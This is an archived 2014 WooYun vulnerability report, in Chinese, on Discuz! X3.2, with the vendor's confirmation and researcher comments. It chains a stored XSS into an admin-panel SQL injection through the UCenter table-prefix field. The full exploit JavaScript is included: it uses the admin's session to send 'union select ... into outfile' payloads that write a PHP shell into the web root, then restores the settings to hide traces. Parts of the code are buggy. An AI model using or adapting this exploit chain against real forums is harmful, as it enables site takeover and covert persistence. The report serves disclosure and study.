{"id": 48917, "wybug_id": "wooyun-2014-076006", "wybug_title": "Discuz!x xss反弹后台无防御sql注入getshell(附带exploit)", "wybug_corp": "Discuz!", "wybug_author": "menmen519", "wybug_date": "2014-09-13 19:48", "wybug_open_date": "2014-12-12 19:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-12：\t细节向公众公开  简要描述： Discuz!x xss反弹后台无防御sql注入getshell，这里的xss只是做一个药引子，因为xss来自日志功能，然而这个日志功能却又默认关闭的，为了测试我们开启它。这个漏洞应该是所有dz通杀的，我下载了最新版本的所以测试通过...... 详细说明：  首先我们开启日志功能，然后存储一个xss看看：测试一个xss页面：\n\n我们调到文章页面看看，是否被执行了：\n\n下来我们看看怎样把这个发给管理员呢，底下有一个举报页面：\n\n我们以管理员的身份看看这个后台的举报请求：\n\n这个过程我们分析完毕了，下来我们看看后台一处，无防御的sql注入：\n\n我们这里就不分析代码了，这里代码好曲折啊，大致思路我们给一张图，就可以看清楚1.设置表前缀，抓包重放如下：\n\n2.然后我们改一下表前缀的注入：\n\n3.我们来监控一下，sql语句的执行过程，我们就明白了，这个漏洞产生的原因    a.当你第一次点击的时候，这个sql语句不会执行，然后你多提交几次，就可以了   b.数据第一次流进了这个表：\n\n看以看出来，做了过滤   c.但是当数据取出来的时候，这个就没有在进行转义，直接从数据库获取，所以造成漏洞：\n\n那么我们去这个目录看看是否生成了我们想要的shell:\n\n这么一来所有的来龙去买我们都搞清楚了，那么怎么样把这两个组合起来，因为有表单hash的存在我们怎么通过xss搞定，思路如下：1.我们通过ajax 首先对表单页面进行一次get访问，大家都知道dz会隐藏的形式写进表单的一个字段为formhash2.有了这个formhash的话我们就可以，再次发送ajax请求，直接发送五次然后geshell3.有人要问为什么要发送五次，这三次分别是什么   a.第一次是get请求获取formhash   b.第二，三次是发送构造的包，因为这第一次发送，是不会成功的，它要利用上次的发包，再二次构造，所以这里面发两次才能产生shell   c.第四,五次请求就是还原人家本来的面目，这里原理是相同的接下来看我们的代码:我们在远端的服务器放置的js内容如下：\nfunction ajax(){\tvar request = false;\tif(window.XMLHttpRequest) {\t\trequest = new XMLHttpRequest();\t} else if(window.ActiveXObject) {\t\tvar versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];\t\tfor(var i=0; i<versions.length; i++) {\t\t\ttry {\t\t\t\trequest = new ActiveXObject(versions[i]);\t\t\t \t\t\t} catch(e) {}\t\t\t  \t\t}\t\t\t  \t}\t\t\t  \treturn request;\t\t\t  }var formhash = '';var cookie = document.cookie;var _x = ajax();\t\t\t  request_get();function request_get() {\t\t\t  \tsrc=\"http://192.168.10.70/Discuz_X3.2_SC_UTF8/upload/admin.php?action=misc&operation=custommenu\";\tdata=\"\";\txhr_act(\"GET\",src,data);\t\t\t  }function sleep(n){\t\t\tvar start=new Date().getTime();\t\t\twhile(true) if(new Date().getTime()-start>n) break;}function request_post(flag) {\tsrc=\"http://192.168.10.70/Discuz_X3.2_SC_UTF8/upload/admin.php?action=setting&edit=yes\";\tif(flag == 1){\tdata='\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"formhash\"\\r\\n\\r\\n3cf53a8d\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"scrolltop\"\\r\\n\\r\\n\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"anchor\"\\r\\n\\r\\n\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"operation\"\\r\\n\\r\\nuc\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][appid]\"\\r\\n\\r\\n1\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][key]\"\\r\\n\\r\\n********\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][api]\"\\r\\n\\r\\nhttp://192.168.10.70/Discuz_X3.2_SC_UTF8/upload/uc_server\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][ip]\"\\r\\n\\r\\n\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][connect]\"\\r\\n\\r\\nmysql\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][dbhost]\"\\r\\n\\r\\nlocalhost\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][dbuser]\"\\r\\n\\r\\nroot\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][dbpass]\"\\r\\n\\r\\n********\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][dbname]\"\\r\\n\\r\\nultrax\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][dbtablepre]\"\\r\\n\\r\\npre_ucenter_vars union select \\'<?php phpinfo()?>\\' into outfile \\'D:/APMSERVER/APMServ5.2.6/www/htdocs/Discuz_X3.2_SC_UTF8/upload/data/shell.php\\'#\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[ucactivation]\"\\r\\n\\r\\n1\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[fastactivation]\"\\r\\n\\r\\n0\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[avatarmethod]\"\\r\\n\\r\\n0\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingsubmit\"\\r\\n\\r\\næäº¤\\r\\n-----------------------------2137124919446--';\t}else{\tdata='\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"formhash\"\\r\\n\\r\\n3cf53a8d\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"scrolltop\"\\r\\n\\r\\n\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"anchor\"\\r\\n\\r\\n\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"operation\"\\r\\n\\r\\nuc\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][appid]\"\\r\\n\\r\\n1\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][key]\"\\r\\n\\r\\n********\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][api]\"\\r\\n\\r\\nhttp://192.168.10.70/Discuz_X3.2_SC_UTF8/upload/uc_server\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][ip]\"\\r\\n\\r\\n\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][connect]\"\\r\\n\\r\\nmysql\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][dbhost]\"\\r\\n\\r\\nlocalhost\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][dbuser]\"\\r\\n\\r\\nroot\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][dbpass]\"\\r\\n\\r\\n********\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][dbname]\"\\r\\n\\r\\nultrax\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[uc][dbtablepre]\"\\r\\n\\r\\npre_ucenter_\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[ucactivation]\"\\r\\n\\r\\n1\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[fastactivation]\"\\r\\n\\r\\n0\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingnew[avatarmethod]\"\\r\\n\\r\\n0\\r\\n-----------------------------2137124919446\\r\\nContent-Disposition: form-data; name=\"settingsubmit\"\\r\\n\\r\\næäº¤\\r\\n-----------------------------2137124919446--';\t}\t\txhr_act(\"POST\",src,data);}\t\t\t  function xhr_act(_m,_s,_a){\tif(_m == \"GET\"){\t\t_x.open(_m,_s,false);\t\t\t\t\t\t_x.setRequestHeader(\"Cookie\",cookie);\t\t\t  \t\t_x.send();\t\t\t  \t\tvar document_str = _x.responseText;\t\t\tvar basestr = 'name=\"formhash\" value=\"';\t\tvar formhashpos = basestr.indexOf(basestr);\t\tvar realpos = formhashpos + basestr.length;\t\tformhash = basestr.substr(realpos,8);\t\tif(formhash){\t\t\tvar count_0 = 3;\t\t\tvar count_1 = 3;\t\t\tfor(var i=0;i<count_0;i++)\t\t\t\trequest_post(1)\t\t\t\t\t\t\tsleep(1000);\t\t\t\t\t\tfor(var j=0;j<count_1;i++)\t\t\t\trequest_post(0)\t\t}\t\t\t}else{\t\t_x.open(_m,_s,false);\t\t\t\t\t\t_x.setRequestHeader(\"Content-Type\",\"multipart/form-data; boundary=---------------------------2137124919446\");\t\t_x.setRequestHeader(\"Cookie\",cookie);\t\t_x.send(_a);\t\t\t  \t\treturn _x.responseText;\t\t\t \t}}\n然后依照刚才的解法，我们应该在那个目录下生成了一个shell.php\n\n最后我们的站点还是可以正常访问，不留痕迹到此为止所有的东西已经做完.............   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-09-15 10:39 厂商回复： 感谢您对我们产品的支持，我们会尽快处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-13 19:56 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  前排.....    \n     2014-09-13 19:57 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  前排2……    \n     2014-09-13 20:08 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  前排3……    \n     2014-09-13 20:09 |    \t\t铁汉 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 向各种大神学习之)\t\t \n  这屌丝，草    \n     2014-09-13 20:10 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @铁汉 放血来了    \n     2014-09-13 20:45 |    \t\tecbug \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:15        | hello wooyun)\t\t \n  这标题咋看不懂呢？到底是xss还是sqli？是不是xss跨到后台再利用后台的sqli注射出key获得shell？那这个意思是说xss是必须的？然后这个xss默认又关闭，那岂不是这个漏洞在实战中就是个鸡肋？只能在代码审计层面YY下？    \n     2014-09-13 21:00 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  就是，。    \n     2014-09-13 21:54 |    \t\tbey0nd \t\t\t( 普通白帽子  |\t\t\t        Rank:895 漏洞数:142        | 相忘于江湖，不如相濡以沫)\t\t \n  mark    \n     2014-09-13 22:21 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @ecbug 不一样的，后台的sql,没有任何防御，直接写文件    \n     2014-09-13 22:24 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @ecbug 再说，我有xss，就是不想公布到这里面，只是演示其危害性    \n     2014-09-13 22:30 |    \t\tkimdle \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | @kimdle)\t\t \n  火前留名    \n     2014-09-13 23:02 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  火钳刘明!    \n     2014-09-13 23:04 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  @menmen519 后台sql写文件？是写到缓存还是利用mysql root？    \n     2014-09-14 09:12 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  @猪头子    \n     2014-09-14 14:41 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  马克    \n     2014-09-15 11:38 |    \t\tRay \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:7        )\t\t \n  @menmen519 hi，冻主，我记得以admin身份发的日志才不会被富文本过滤，所以，这是不是个误报呢。    \n     2014-09-15 11:43 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @Ray 这里不会的，这里是利用了xss，其实随便找个xss就可以，主要功能点不在这里    \n     2014-09-15 13:43 |    \t\tziwen \t\t\t( 实习白帽子  |\t\t\t        Rank:49 漏洞数:4        | 活着为了乐还是为了苦？)\t\t \n  好像很吊的样子。。    \n     2014-09-18 18:09 |    \t\t子丑寅卯辰 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 子丑寅卯辰巳午未申酉戌亥)\t\t \n  竟然附带exploit。。。cncert不用加班了    \n     2014-09-19 16:28 |    \t\tRay \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:7        )\t\t \n  @menmen519 \t$POST['message'] = checkhtml($POST['message']);……function checkhtml($html) {\tif(!checkperm('allowhtml')) {不要和我说这里没有任何处理，只是你的admin账户有allowhtml的perm    \n     2014-11-02 20:02 |    \t\t微尘 \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:74        )\t\t \n  @menmen519  这个拿shell需要root权限吧？    \n     2014-12-12 22:16 |    \t\tID被封，再混个ID \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 1)\t\t \n  @Ray 貌似dz和wp的是一样的啊，管理员不受限制，这个感觉是误报    \n     2014-12-13 11:08 |    \t\tcmxz \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:13        | )\t\t \n  @ID被封，再混个ID 洞主的意思是通过任意的XSS让管理员来执行sql。不过既然都能xss了，为何不拿到管理员cookie直接自己登陆呢！？@menmen519    \n     2014-12-13 11:29 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @cmxz dz后台很少有sql注射 你们可以看一下这个原理 很有意思的    \n     2014-12-13 20:49 |    \t\t廷廷 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 有很强的好奇心，爱好广泛，求女女带走。。...)\t\t \n  5次提交 学习了 还可以这样玩    \n     2014-12-17 21:02 |    \t\t迦南 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:11        | 我不是玩黑，我就是认真)\t\t \n  详细很好的思路    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}